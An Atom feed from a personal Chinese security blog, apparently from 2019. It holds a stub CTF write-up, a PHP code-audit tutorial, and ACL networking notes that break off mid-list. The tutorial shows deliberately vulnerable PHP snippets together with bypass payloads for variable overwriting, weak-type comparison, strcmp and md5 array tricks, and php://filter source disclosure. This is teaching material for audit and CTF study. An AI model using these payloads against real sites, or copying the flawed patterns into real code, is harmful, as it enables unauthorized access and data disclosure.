<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>peri0d的博客</title>
  
  <subtitle>peri0d</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-06-05T11:21:46.047Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>peri0d</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>强网杯web复现</title>
    <link href="http://yoursite.com/2019/06/05/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/06/05/2019强网杯web复现/</id>
    <published>2019-06-05T04:17:46.234Z</published>
    <updated>2019-06-05T11:21:46.047Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UPLOAD"><a href="#UPLOAD" class="headerlink" title="UPLOAD"></a>UPLOAD</h1><ol><li>打开靶机，有登陆和注册的页面</li><li>注册登陆，进入到一个上传页面</li><li>测试了一下，只能上传正常的图片，非 png 格式会自动转化为 png</li></ol><h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;UPLOAD&quot;&gt;&lt;a href=&quot;#UPLOAD&quot; class=&quot;headerlink&quot; title=&quot;UPLOAD&quot;&gt;&lt;/a&gt;UPLOAD&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;打开靶机，有登陆和注册的页面&lt;/li&gt;
&lt;li&gt;注册登陆，进入到一个上传页面&lt;/li&gt;
&lt;li&gt;
      
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
      <category term="QWB" scheme="http://yoursite.com/tags/QWB/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计(二)</title>
    <link href="http://yoursite.com/2019/06/04/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)/"/>
    <id>http://yoursite.com/2019/06/04/PHP代码审计(二)/</id>
    <published>2019-06-04T09:06:08.257Z</published>
    <updated>2019-06-08T08:34:55.221Z</updated>
    
    <content type="html"><![CDATA[<h1 id="审计中涉及的超全局变量"><a href="#审计中涉及的超全局变量" class="headerlink" title="审计中涉及的超全局变量"></a>审计中涉及的超全局变量</h1><ul><li><p>全局变量</p><p>在函数外面定义的变量，不能在函数中直接使用。在函数中使用时加上global</p></li><li><p>超全局变量</p><p>作用域在所有脚本，比如$_GET，$_SERVER。除$_GET, $_POST, $_SERVER, $_COOKIE等之外的超全局变量保存在 $GLOBALS 数组中</p></li></ul><h2 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h2><ul><li><p>global</p><p>定义全局变量，只应用于当前网页而不是整个网站，可以视为参数的传递</p></li><li><p>$GLOBALS</p><p>在 PHP 脚本中的任意位置访问全局变量，可以视为变量的作用域设置全局</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$var1 = <span class="number">1</span>;</span><br><span class="line">$var2 = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">$GLOBALS[<span class="string">'var1'</span>] = $GLOBALS[<span class="string">'var2'</span>];</span><br><span class="line">&#125;</span><br><span class="line">test1();</span><br><span class="line"><span class="keyword">echo</span> $var1;<span class="comment">//2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $var1,$var2;</span><br><span class="line">$var1 = $var2</span><br><span class="line">&#125;</span><br><span class="line">test2();</span><br><span class="line"><span class="keyword">echo</span> $var1;<span class="comment">//2</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="POST-和-GET"><a href="#POST-和-GET" class="headerlink" title="$_POST 和 $_GET"></a>$_POST 和 $_GET</h2><ul><li><p>POST</p><p>隐藏传参，将表单内各个字段与其内容放在 Request Header 内传给服务器</p></li><li><p>GET</p><p>URL 传参，将参数放在提交表单的 ACTION 属性所指的 URL 中</p></li></ul><h2 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h2><ul><li>PHP 中 $_REQUEST 可以获取 以 POST 和 GET 方法提交的数据</li><li>尽量不要使用</li></ul><h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><ul><li>这种超全局变量保存关于报头、路径和脚本位置的信息</li><li>数组</li></ul><h2 id="FILE"><a href="#FILE" class="headerlink" title="$_FILE"></a>$_FILE</h2><ul><li>保存上传文件的信息</li><li>数组</li></ul><h2 id="SESSION"><a href="#SESSION" class="headerlink" title="$_SESSION"></a>$_SESSION</h2><ul><li>保存 SESSION 信息</li><li>数组</li></ul><h2 id="COOKIE"><a href="#COOKIE" class="headerlink" title="$_COOKIE"></a>$_COOKIE</h2><ul><li>保存 COOKIE 信息</li><li>数组</li></ul><h2 id="ENV"><a href="#ENV" class="headerlink" title="$_ENV"></a>$_ENV</h2><ul><li>包含服务器环境变量的数组</li><li>只是被动的接受服务器端的环境变量转换为数组</li></ul><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><ul><li>变量未初始化，我们自定义的参数值可以替换程序原有的变量值</li></ul><h2 id><a href="#" class="headerlink" title="$$"></a>$$</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x = <span class="string">'123'</span>;</span><br><span class="line">$b = <span class="string">'456'</span>;</span><br><span class="line"></span><br><span class="line">$x = $_GET[<span class="string">'x'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$x);"</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($x);"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>变量 x 初始化为 ‘123’</p><p>传入参数 ?x=b，$$x 就相当于 $b，这时的输出为 string(3) “456”，string(1) “b”</p><p>传入参数 ?x=x=789，$$x 相当于 ${x=789}，这时输出为 int(789)，int(789)，x 值以被覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line">$_403 = <span class="string">"Access Denied"</span>;</span><br><span class="line">$_200 = <span class="string">"Welcome Admin"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"CTF is here :p…"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )</span><br><span class="line">    <span class="keyword">die</span>($_403);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    $$key = $$value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    $$key = $value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )</span><br><span class="line">    <span class="keyword">die</span>($_403);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is your flag : "</span>. $flag . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($_200);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：?_200=flag post：flag=1</p><p>通过 $$key=$$value 将 flag 的值赋给 _200，post 中的 flag 为：${flag}=1，所以 post 的值永远和 $flag 相同，接着利用 die($_200) 将真实的 flag 输出</p><h2 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h2><blockquote><p>extract(<em>array,extract_rules,prefix</em>)</p></blockquote><p>extract() 函数使用数组键名作为变量名，使用数组键值作为变量值，创建这些变量。该函数返回成功设置的变量数目。</p><p>extract_rules 参数：</p><ul><li>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</li><li>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。</li><li>EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。</li><li>EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。</li><li>EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。</li><li>EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。</li><li>EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。</li><li>EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"Original"</span>;</span><br><span class="line">$my_array = <span class="keyword">array</span>(<span class="string">"a"</span> =&gt; <span class="string">"Cat"</span>, <span class="string">"b"</span> =&gt; <span class="string">"Dog"</span>, <span class="string">"c"</span> =&gt; <span class="string">"Horse"</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line">extract($my_array);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\$a = $a; \$b = $b; \$c = $c"</span>;</span><br><span class="line"><span class="comment">//Original $a = Cat; $b = Dog; $c = Horse</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REQUEST_METHOD"</span>]==<span class="string">"POST"</span>)&#123;</span><br><span class="line">    extract($_POST);</span><br><span class="line">    <span class="keyword">if</span>($pass == $password_hard)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"peri0d"</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：post：pass=123&amp;password_hard=123</p><p>传入的 $_POST 是一个数组，为 <code>array(2) {[&quot;pass&quot;]=&gt;string(3) &quot;123&quot; [&quot;password_hard&quot;]=&gt;string(3) &quot;123&quot;}</code></p><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h2><blockquote><p>parse_str(<em>string,array</em>)</p></blockquote><p>parse_str() 函数把查询字符串解析到变量中。如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name = <span class="string">'peri0d'</span>;</span><br><span class="line">parse_str(<span class="string">'name=peri0d_2&amp;sex=1'</span>);</span><br><span class="line"><span class="keyword">echo</span> $name.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sex;</span><br><span class="line"><span class="comment">//peri0d_21</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'x'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">    $m = <span class="string">"guest"</span>;</span><br><span class="line">    $x = $_GET[<span class="string">'x'</span>];</span><br><span class="line">    @parse_str($x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($m[<span class="number">0</span>] == <span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"so easy!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：?x=m[0]=admin</p><p>parse_str($x) 即为 parse_str(m[0]=admin)，实现变量覆盖。</p><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><ul><li>序列化：把一个复杂的数据类型压缩为一个字符串</li><li>反序列化：把一个字符串恢复成复杂的数据类型</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$x = &quot;peri0d 2019&quot;;</span><br><span class="line">$y = array(&quot;peri0d&quot;,2019);</span><br><span class="line">echo serialize($x).&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo serialize($y);</span><br><span class="line">//s:11:&quot;peri0d 2019&quot;;</span><br><span class="line">//a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;i:2019;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><ul><li>反序列化对象中存在魔术方法，而且魔术方法中的代码可以被控制，漏洞根据不同的代码可以导致各种攻击</li><li>unserialize 函数的变量可控</li><li>php 文件存在可利用的类，类中有魔术方法</li></ul><h2 id="序列化的不同结果"><a href="#序列化的不同结果" class="headerlink" title="序列化的不同结果"></a>序列化的不同结果</h2><ul><li>public</li><li>private</li><li>protect</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $x = <span class="string">"peri0dx"</span>;</span><br><span class="line">    <span class="keyword">public</span>  $y = <span class="string">"peri0dy"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $z = <span class="string">"peri0dz"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize($t);</span><br><span class="line"><span class="comment">//O:4:"test":3:&#123;s:7:"testx";s:7:"peri0dx";s:1:"y";s:7:"peri0dy";s:4:"*z";s:7:"peri0dz";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><ul><li>construct() : 当一个类被创建时自动调用</li><li>destruct() : 当一个类被销毁时自动调用</li><li>invoke() : 当把一个类当作函数使用时自动调用</li><li>toString() : 当把一个类当作字符串使用时自动调用</li><li>wakeup() : 当调用unserialize()函数时自动调用</li><li>sleep() : 当调用serialize()函数时自动调用</li><li>call() : 当要调用的方法不存在或权限不足时自动调用</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/magic_method.png" alt></p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>CVE-2016-7124</p><h1 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h1><h2 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h2><ul><li>标准类型：布尔，整型，浮点，字符</li><li>复杂类型：数据，对象</li><li>特殊类型：资源</li></ul><h2 id="操作之间的比较"><a href="#操作之间的比较" class="headerlink" title="操作之间的比较"></a>操作之间的比较</h2><ol><li><p>字符串和数字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="number">0</span> == <span class="string">"admin"</span>);    <span class="comment">//T</span></span><br><span class="line">var_dump(<span class="string">"1admin"</span> == <span class="number">1</span>);   <span class="comment">//T</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span> == <span class="number">1</span>);   <span class="comment">//F</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span> == <span class="number">0</span>);   <span class="comment">//T</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>数字和数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>();</span><br><span class="line">var_dump(<span class="number">0</span> == $arr);    <span class="comment">//F</span></span><br><span class="line">var_dump(<span class="number">123</span> == $arr);  <span class="comment">//F</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>字符串和数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>();</span><br><span class="line">var_dump(<span class="string">'0'</span> == $arr);    <span class="comment">//F</span></span><br><span class="line">var_dump(<span class="string">'123'</span> == $arr);  <span class="comment">//F</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>“合法数字+e+合法数字” 类型的字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">"0e1234"</span> == <span class="string">"0e56789"</span>);   <span class="comment">//T</span></span><br><span class="line">var_dump(<span class="string">"1e1123"</span> == <span class="string">"10"</span>);        <span class="comment">//F</span></span><br><span class="line">var_dump(<span class="string">"1e1"</span> == <span class="string">"10"</span>);           <span class="comment">//T</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>== 和 ===</p><p>在PHP里面    ==   比较指比较值，不同类型会转换成同一类型比较。用   ===   比较时，必须值和类型都一样才为true</p></li></ol><h2 id="empty-与-isset"><a href="#empty-与-isset" class="headerlink" title="empty 与 isset"></a>empty 与 isset</h2><ul><li>变量为：0, “0”, null, false, array() 时，使用 empty 函数，返回值为 true</li><li>变量未定义或为 null 时，isset 函数返回 false，其他都返回 true</li></ul><h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5 函数"></a>md5 函数</h2><p>传入数组进行比较时全为 true</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr1 = <span class="keyword">array</span>(<span class="string">'test1'</span>, <span class="string">'test2'</span>, <span class="string">'2019'</span>);</span><br><span class="line">$arr2 = <span class="keyword">array</span>(<span class="string">'test3'</span>, <span class="string">'test4'</span>, <span class="string">'2019'</span>);</span><br><span class="line">var_dump(md5($arr1) == md5($arr2));    <span class="comment">//T</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="strcmp-函数"><a href="#strcmp-函数" class="headerlink" title="strcmp 函数"></a>strcmp 函数</h2><blockquote><p>strcmp(<em>string1</em>, <em>string2</em>)</p></blockquote><p>比较 string1 和 string2。如果相等返回 0；如果 string1 小于 string2，返回 &lt;0；如果 string1 大于 string2，返回 &gt;0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass = <span class="string">'123456'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pwd'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strcmp($_GET[<span class="string">'pwd'</span>], $pass) == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'fail'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：?pwd[]=1</p><h2 id="in-array-与-array-search"><a href="#in-array-与-array-search" class="headerlink" title="in_array() 与 array_search()"></a>in_array() 与 array_search()</h2><p><strong>in_array()</strong> 函数搜索数组中是否存在指定的值。如果在数组中找到值则返回 TRUE，否则返回 FALSE。</p><blockquote><p>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</p></blockquote><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/in_array.png" alt></p><p><strong>array_search()</strong> 函数在数组中搜索某个键值，并返回对应的键名。如果在数组中找到指定的键值，则返回对应的键名，否则返回 FALSE。如果在数组中找到键值超过一次，则返回第一次找到的键值所匹配的键名。</p><blockquote><p>array_search(<em>value</em>, <em>array</em>, <em>strict</em>) </p></blockquote><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/array_search.png" alt></p><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><p>如果 switch 是数字类型的 case 判断时，switch 会将参数转换为 int 类型</p><h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><ul><li>用于访问本地系统文件，不受 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong> 影响</li><li>常与文件包含结合在一起使用</li></ul><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><ul><li>读取源代码并以base-64编码形式输出，不受 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong> 影响</li><li>常与文件包含结合在一起使用</li><li>经典用法：?file=php://filter/read=convert.base64-encode/resource=./index.php</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/filter.png" alt></p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><ul><li>可以访问请求的原始数据的只读流，<strong>allow_url_include</strong> 为 on 时可以使用，不受 <strong>allow_url_fopen</strong> 影响</li></ul><h1 id="会话认证漏洞"><a href="#会话认证漏洞" class="headerlink" title="会话认证漏洞"></a>会话认证漏洞</h1><ul><li>Session 固定攻击</li><li>Session 劫持攻击</li><li>通常出现在 cookie 验证上，通常不使用 session 认证</li></ul><h2 id="Session-劫持攻击"><a href="#Session-劫持攻击" class="headerlink" title="Session 劫持攻击"></a>Session 劫持攻击</h2><ul><li>获取用户的 session id，然后修改数据</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/session_1.png" alt></p><h2 id="Session-固定攻击"><a href="#Session-固定攻击" class="headerlink" title="Session 固定攻击"></a>Session 固定攻击</h2><ul><li>用户使用了黑客发送的 session id，网站就不会给用户发送 session id</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/session_2.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;审计中涉及的超全局变量&quot;&gt;&lt;a href=&quot;#审计中涉及的超全局变量&quot; class=&quot;headerlink&quot; title=&quot;审计中涉及的超全局变量&quot;&gt;&lt;/a&gt;审计中涉及的超全局变量&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;全局变量&lt;/p&gt;
&lt;p&gt;在函数外面定义的变量，不能
      
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计(二)</title>
    <link href="http://yoursite.com/2019/06/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%80%BB%E7%BB%93(%E5%9B%9B)/"/>
    <id>http://yoursite.com/2019/06/04/计算机网络总结(四)/</id>
    <published>2019-06-04T08:12:52.738Z</published>
    <updated>2019-06-07T15:32:57.596Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h1><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul><li>Access Control List 访问控制列表</li><li>作为过滤器时，应用在接口上的，必须挂在一个接口上</li><li>一般有两个接口，出口和入口，一个接口最多挂 2 个 ACL，一个方向上最多挂一个 ACL</li></ul><h2 id="Why-Use-ACLs"><a href="#Why-Use-ACLs" class="headerlink" title="Why Use ACLs"></a>Why Use ACLs</h2><ul><li>Filtering : Manage IP traffic by filtering packets passing through a router</li><li>Classification : Identify traffic for special handling</li></ul><blockquote><p>用于过滤流量时单独使用，用于分类时配合其他协议或应用使用</p></blockquote><h2 id="Filtering"><a href="#Filtering" class="headerlink" title="Filtering"></a>Filtering</h2><ul><li>Permit or deny packets moving through the router</li><li>Permit or deny vty access to re from the router</li></ul><blockquote><p>一般可以检查到第 4 层，可以理解为一个包过滤防火墙，但不是一个专业的防火墙</p></blockquote><h2 id="Classification"><a href="#Classification" class="headerlink" title="Classification"></a>Classification</h2><ul><li>Special handing for traffic based on packet tests</li></ul><blockquote><p>就是为其他协议提供分类服务，而不丢弃数据包</p></blockquote><h2 id="Outbound-ACL-Operation"><a href="#Outbound-ACL-Operation" class="headerlink" title="Outbound ACL Operation"></a>Outbound ACL Operation</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/27.png" alt></p><blockquote><p>ACL Test：只要匹配一个就立即执行这个条件所规定的动作，不再匹配下面的</p></blockquote><h2 id="Types-of-ACLS"><a href="#Types-of-ACLS" class="headerlink" title="Types of ACLS"></a>Types of ACLS</h2><ul><li>Standard ACL<ul><li>Checks source address</li><li>Generally permits or denies entire protocol suite</li><li>Slow speed</li></ul></li><li>Extended ACL<ul><li>Checks source and destination address</li><li>Generally permits or denies specific protocols and applications</li><li>Fast 